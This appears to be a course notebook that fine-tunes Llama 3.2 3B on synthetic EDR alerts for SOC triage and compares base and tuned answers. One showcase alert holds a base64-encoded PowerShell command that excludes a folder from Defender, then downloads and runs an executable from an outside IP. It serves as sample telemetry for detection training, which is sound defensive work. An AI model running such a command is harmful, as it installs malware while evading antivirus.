# SOC Alert Triage: fine-tuning Llama 3.2 3B with Unsloth

Fine-tunes `unsloth/Llama-3.2-3B-Instruct` with LoRA on a synthetic EDR alert triage dataset, compares it with the base model on the same alerts, and exports a GGUF for Ollama.

Runs end to end with no input after the data is available. Works on **Colab** or **Kaggle**.

- **Colab:** Runtime > Change runtime type > **T4 GPU**, then Runtime > Run all. Upload `train.jsonl` and `test.jsonl` when cell 3 asks.
- **Kaggle:** Settings > Accelerator > **GPU T4 x2** (not P100), Internet **on**. Add `train.jsonl` and `test.jsonl` as a dataset (Add Input > Upload). Then **Save Version > Save & Run All (Commit)** and close the tab. It runs in the background; outputs appear under the notebook's Output tab.

At the end the model is saved as ~200 MB pieces in `model_parts/` plus `comparison.html`.

Screenshots this notebook produces for the assignment:
1. Dataset loaded (cell 4)
2. Training loss (cell 8, plus the loss chart in cell 9)
3. Base vs fine-tuned answers to the same 3 alerts (cell 11)

## 1. Install Unsloth

In [ ]:
%%capture
!pip install unsloth

## 2. Load the base model in 4-bit and attach LoRA adapters

In [ ]:
from unsloth import FastLanguageModel
import torch

MAX_SEQ_LENGTH = 2048   # longest training example is ~1,450 tokens

model, tokenizer = FastLanguageModel.from_pretrained(
    model_name="unsloth/Llama-3.2-3B-Instruct",
    max_seq_length=MAX_SEQ_LENGTH,
    load_in_4bit=True,
)

model = FastLanguageModel.get_peft_model(
    model,
    r=16,
    lora_alpha=16,
    lora_dropout=0,
    target_modules=["q_proj", "k_proj", "v_proj", "o_proj", "gate_proj", "up_proj", "down_proj"],
    bias="none",
    use_gradient_checkpointing="unsloth",
    random_state=3407,
)

## 3. Upload the dataset files

In [ ]:
import os, glob
IN_KAGGLE = os.path.exists("/kaggle")
OUT = "/kaggle/working" if IN_KAGGLE else "/content"
os.makedirs(OUT, exist_ok=True)

def find(name):
    hits = glob.glob(name) + glob.glob("/kaggle/input/**/" + name, recursive=True) + glob.glob("/content/**/" + name, recursive=True)
    return hits[0] if hits else None

if not (find("train.jsonl") and find("test.jsonl")) and not IN_KAGGLE:
    from google.colab import files
    files.upload()   # choose train.jsonl and test.jsonl
TRAIN, TEST = find("train.jsonl"), find("test.jsonl")
assert TRAIN and TEST, "train.jsonl / test.jsonl not found - add them as an input dataset"
print("train:", TRAIN, "| test:", TEST, "| output dir:", OUT)

## 4. Load and inspect the data (dataset screenshot)

In [ ]:
import pandas as pd
from datasets import load_dataset

raw = load_dataset("json", data_files={"train": TRAIN, "test": TEST})
print(raw)

meta = pd.DataFrame(raw["train"]["meta"])
print("\nVerdict counts:\n", meta["verdict"].value_counts())
print("\nExamples with retrieved RAG context:", int(meta["rag"].sum()))
display(meta.head(10))

ex = raw["train"][0]["conversations"]
print("\n--- USER ---\n" + ex[1]["content"][:1500])
print("\n--- ASSISTANT ---\n" + ex[2]["content"])

## 5. Apply the Llama 3.1 chat template

In [ ]:
from unsloth.chat_templates import get_chat_template

tokenizer = get_chat_template(tokenizer, chat_template="llama-3.1")

def to_text(batch):
    return {"text": [tokenizer.apply_chat_template(c, tokenize=False, add_generation_prompt=False)
                     for c in batch["conversations"]]}

train_ds = raw["train"].map(to_text, batched=True, remove_columns=raw["train"].column_names)
eval_ds = raw["test"].map(to_text, batched=True, remove_columns=raw["test"].column_names)
print(train_ds[0]["text"][:800])

## 6. Configure the trainer

One epoch, effective batch size 8, so about 130 steps. Takes roughly 20 to 35 minutes on a T4.

In [ ]:
from trl import SFTTrainer, SFTConfig
from unsloth.chat_templates import train_on_responses_only

trainer = SFTTrainer(
    model=model,
    tokenizer=tokenizer,
    train_dataset=train_ds,
    eval_dataset=eval_ds,
    args=SFTConfig(
        dataset_text_field="text",
        max_seq_length=MAX_SEQ_LENGTH,
        per_device_train_batch_size=2,
        gradient_accumulation_steps=4,
        per_device_eval_batch_size=2,
        num_train_epochs=1,
        warmup_steps=10,
        learning_rate=2e-4,
        lr_scheduler_type="linear",
        optim="adamw_8bit",
        weight_decay=0.01,
        logging_steps=5,
        eval_strategy="steps",
        eval_steps=40,
        seed=3407,
        output_dir="outputs",
        report_to="none",
    ),
)

# Compute loss only on the analyst's answer, not on the system prompt or alert.
trainer = train_on_responses_only(
    trainer,
    instruction_part="<|start_header_id|>user<|end_header_id|>\n\n",
    response_part="<|start_header_id|>assistant<|end_header_id|>\n\n",
)

## 7. Showcase alerts and a helper to query the model

These alerts were generated separately and are not in the training data.

In [ ]:
SYSTEM_PROMPT = "You are a Tier-2 SOC analyst. Triage the EDR alert you are given and choose one verdict. True Positive: malicious or unauthorized activity. Benign True Positive: the security-relevant action the rule watches for really happened, but an authorized person or system performed it. False Positive: the rule matched ordinary OS or application behavior that is not the watched action. Needs Investigation: the telemetry alone cannot decide; state what would resolve it. Judge processes by full path, signature, and prevalence, not by name alone. Map the activity to MITRE ATT&CK, cite specific evidence from the alert, and give concrete next actions. If retrieved context documents are provided, use them and list the documents you relied on in a final 'Sources:' line. Use the exact output format."

SHOWCASE = [
 {
  "name": "ps_encoded_sccm",
  "prompt": "Triage this alert:\n\nEDR ALERT (JSON)\n{\n  \"detection_name\": \"Suspicious encoded PowerShell command\",\n  \"severity\": \"Medium\",\n  \"timestamp\": \"2026-08-22T17:39:35Z\",\n  \"device\": {\n    \"hostname\": \"WS-FIN-082\",\n    \"device_group\": \"Finance Workstations\",\n    \"os\": \"Windows 11 23H2\"\n  },\n  \"user\": \"NT AUTHORITY\\\\SYSTEM\",\n  \"process\": {\n    \"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n    \"command_line\": \"powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -EncodedCommand RwBlAHQALQBIAG8AdABGAGkAeAAgAHwAIABTAG8AcgB0AC0ATwBiAGoAZQBjAHQAIABJAG4AcwB0AGEAbABsAGUAZABPAG4AIAAtAEQAZQBzAGMAZQBuAGQAaQBuAGcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARgBpAHIAcwB0ACAANQA=\",\n    \"ancestry\": \"C:\\\\Windows\\\\CCM\\\\CcmExec.exe <- C:\\\\Windows\\\\System32\\\\services.exe\",\n    \"signature\": \"Signed: Microsoft Windows\",\n    \"prevalence\": \"Image present on all managed hosts\",\n    \"sha256\": \"c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed\"\n  },\n  \"network\": \"None observed\",\n  \"context\": \"Parent CcmExec.exe signature: Microsoft Corporation; parent prevalence: all managed hosts\"\n}"
 },
 {
  "name": "lsass_werfault",
  "prompt": "Triage this alert:\n\nEDR ALERT\nDetection: Suspicious access to LSASS process memory\nVendor severity: High\nTimestamp: 2026-04-27T07:00:39Z\nHost: SRV-SQL08 (Device group: Database Servers, OS: Windows Server 2025)\nUser: NT AUTHORITY\\SYSTEM\nProcess: C:\\Windows\\System32\\WerFault.exe\nCommand line: C:\\Windows\\system32\\WerFault.exe -u -p 641 -s 213\nProcess tree: C:\\Windows\\System32\\svchost.exe -k WerSvcGroup <- C:\\Windows\\System32\\services.exe\nSignature: Signed: Microsoft Windows\nPrevalence: Image present on all managed hosts\nSHA256: 43672c014b736ad7993cfe6d86c19af94e19a627dafa43938859c911282a1cb3\nNetwork: None observed\nAdditional context: Application Error event 1000 for lsass.exe logged 2 seconds earlier; output in C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue"
 },
 {
  "name": "ps_encoded_fake_sccm",
  "prompt": "Triage this alert:\n\nEDR ALERT\nDetection: Suspicious encoded PowerShell command\nVendor severity: High\nTimestamp: 2026-04-16T08:22:59Z\nHost: WS-LGL-081 (Device group: Legal Workstations, OS: Windows 11 23H2)\nUser: CORP\\jkowalski\nProcess: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommand line: powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQAZQBuAHYAOgBBAFAAUABEAEEAVABBADsAIABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADAANwAuADkANwAuADEAOQAxAC8AdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAdQAuAGUAeABlADsAIAAmACAAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXAB1AC4AZQB4AGUA\nProcess tree: C:\\Users\\Public\\CCM\\CcmExec.exe <- C:\\Windows\\explorer.exe\nSignature: Signed: Microsoft Windows\nPrevalence: Image present on all managed hosts\nSHA256: c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed\nNetwork: Outbound TCP 185.207.97.191:80 from powershell.exe\nAdditional context: Parent C:\\Users\\Public\\CCM\\CcmExec.exe signature: Unsigned; parent prevalence: 1 host"
 },
 {
  "name": "psexec_ambiguous",
  "prompt": "Triage this alert:\n\nEDR ALERT\nDetection: Remote service creation (PsExec-style)\nVendor severity: High\nTimestamp: 2026-08-17T17:19:01Z\nHost: WS-SLS-118 (Device group: Sales Workstations, OS: Windows 11 23H2)\nUser: CORP\\adm-hschmidt\nProcess: C:\\Users\\adm-hschmidt\\Downloads\\PsExec64.exe\nCommand line: PsExec64.exe \\\\SRV-APP12 -s cmd /c \"ipconfig /all & net localgroup administrators\"\nProcess tree: C:\\Windows\\System32\\cmd.exe <- C:\\Windows\\explorer.exe\nSignature: Signed: Microsoft Corporation (original filename PsExec64.exe)\nPrevalence: Image seen on 2 hosts in last 30 days\nSHA256: ed2cf3dfc8df07413df4f73ef8c9fcd698014efb68fefd19ae3e8e5df28fb36d\nNetwork: SMB to SRV-APP12; PsExec64.exe downloaded from live.sysinternals.com 5 minutes earlier\nAdditional context: Single target SRV-APP12"
 }
]

from transformers import TextStreamer

def ask(prompt, max_new_tokens=600):
    FastLanguageModel.for_inference(model)
    msgs = [{"role": "system", "content": SYSTEM_PROMPT}, {"role": "user", "content": prompt}]
    ids = tokenizer.apply_chat_template(msgs, add_generation_prompt=True, return_tensors="pt").to("cuda")
    out = model.generate(input_ids=ids, max_new_tokens=max_new_tokens, temperature=0.1, do_sample=True,
                         pad_token_id=tokenizer.eos_token_id)
    return tokenizer.decode(out[0][ids.shape[1]:], skip_special_tokens=True)

# Base-model answers BEFORE training (LoRA adapters are untrained, so disable them to be exact).
base_answers = []
with model.disable_adapter():
    for s in SHOWCASE[:3]:
        base_answers.append(ask(s["prompt"]))
print("Captured base-model answers for", [s["name"] for s in SHOWCASE[:3]])

## 8. Train (training screenshot: the loss column)

In [ ]:
FastLanguageModel.for_training(model)
stats = trainer.train()
print(stats)

## 9. Loss chart

In [ ]:
import matplotlib.pyplot as plt
log = pd.DataFrame(trainer.state.log_history)
tr = log.dropna(subset=["loss"])
ev = log.dropna(subset=["eval_loss"]) if "eval_loss" in log else pd.DataFrame()
plt.figure(figsize=(8, 4))
plt.plot(tr["step"], tr["loss"], label="training loss")
if len(ev):
    plt.plot(ev["step"], ev["eval_loss"], "o-", label="eval loss (test.jsonl)")
plt.xlabel("step"); plt.ylabel("loss"); plt.title("SOC triage fine-tune: Llama 3.2 3B + LoRA")
plt.legend(); plt.grid(alpha=0.3); plt.show()

## 10. Fine-tuned answers to the same alerts

In [ ]:
ft_answers = [ask(s["prompt"]) for s in SHOWCASE[:3]]

## 11. Side-by-side comparison (comparison screenshots)

In [ ]:
from IPython.display import HTML, display
import html

page = []
for s, b, f in zip(SHOWCASE[:3], base_answers, ft_answers):
    page.append(
        "<h3>{}</h3><details><summary>alert</summary><pre style='white-space:pre-wrap'>{}</pre></details>"
        "<table style='width:100%;table-layout:fixed'><tr><th>Base Llama 3.2 3B</th><th>Fine-tuned</th></tr>"
        "<tr><td style='vertical-align:top'><pre style='white-space:pre-wrap'>{}</pre></td>"
        "<td style='vertical-align:top'><pre style='white-space:pre-wrap'>{}</pre></td></tr></table>".format(
            html.escape(s["name"]), html.escape(s["prompt"]), html.escape(b), html.escape(f)))
display(HTML("".join(page)))
open(os.path.join(OUT, "comparison.html"), "w", encoding="utf-8").write(
    "<html><body style='font-family:sans-serif'>" + "".join(page) + "</body></html>")
print("Saved", os.path.join(OUT, "comparison.html"))

## 12. Save the LoRA adapters (small, useful as a backup)

In [ ]:
model.save_pretrained(os.path.join(OUT, "soc-triage-lora"))
tokenizer.save_pretrained(os.path.join(OUT, "soc-triage-lora"))

## 13. Export GGUF for Ollama

Builds llama.cpp and quantizes to q4_k_m. Takes about 10 to 15 minutes.

In [ ]:
GGUF_DIR = os.path.join(OUT, "soc-triage-gguf")
model.save_pretrained_gguf(GGUF_DIR, tokenizer, quantization_method="q4_k_m")
ggufs = [f for f in glob.glob(OUT + "/**/*.gguf", recursive=True) + glob.glob("/content/**/*.gguf", recursive=True)
         if "q4_k_m" in f.lower()]
GGUF = max(ggufs, key=os.path.getmtime)
print("GGUF:", GGUF, round(os.path.getsize(GGUF) / 1e9, 2), "GB")

## 14. Split the model into ~200 MB pieces and download them

Small pieces avoid browser failures on one 1.9 GB file. On Colab they download automatically; allow multiple downloads if Chrome asks.

In [ ]:
import hashlib, shutil, time
PARTS = os.path.join(OUT, "model_parts")
shutil.rmtree(PARTS, ignore_errors=True); os.makedirs(PARTS)
h, i, CH = hashlib.sha256(), 0, 200 * 1024 * 1024
with open(GGUF, "rb") as f:
    while True:
        b = f.read(CH)
        if not b:
            break
        h.update(b)
        with open(os.path.join(PARTS, f"model.part{i:02d}"), "wb") as o:
            o.write(b)
        i += 1
open(os.path.join(PARTS, "SHA256.txt"), "w").write(h.hexdigest() + "  " + os.path.basename(GGUF))
# remove the large intermediate files so Kaggle output stays small
for big in glob.glob(OUT + "/**/*.gguf", recursive=True):
    os.remove(big)
print(i, "parts in", PARTS, "| sha256:", h.hexdigest())
if not IN_KAGGLE:
    from google.colab import files
    for p in sorted(glob.glob(PARTS + "/*")):
        files.download(p); time.sleep(8)